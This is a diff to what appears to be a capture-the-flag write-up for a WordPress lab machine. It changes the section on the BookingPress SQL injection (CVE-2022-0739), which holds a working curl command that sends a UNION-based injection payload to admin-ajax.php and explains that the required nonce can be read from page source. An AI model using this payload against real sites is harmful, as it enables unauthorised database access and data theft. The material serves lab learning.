@@ -60,10 +60,14 @@ Following is the main page of target machine, which was powered by `Wordpress`
 <br>
 
 ## 2-1. BookingPress SQLi (CVE-2022-0739)
-Searching for confirmed vulnerability, the exploitation uses vulnerability inside `admin-ajax.php` under `wp-admin` directory, which was not using sanitized parameter. Following is the proof of concept:
+Searching for confirmed vulnerability, the exploitation uses vulnerability inside `admin-ajax.php` under `wp-admin` directory, which was not using sanitized parameter. Following is the payload:
 ```bash
 curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=ba6f278b09&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
 ```
+<br>
+
+Becacuse of the weak sanitization and it is confirmed that the internal database is MySQL, it is confirmed that the internal database could be accessed with `UNION` injection once the attacker knows value of `_wpnonce`. In this case, it could be found on the source of the outdated `BookingPress` source page:
+<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/fbf6e1bc-e788-4750-9fe0-b926110a6c67" />
 
 
 
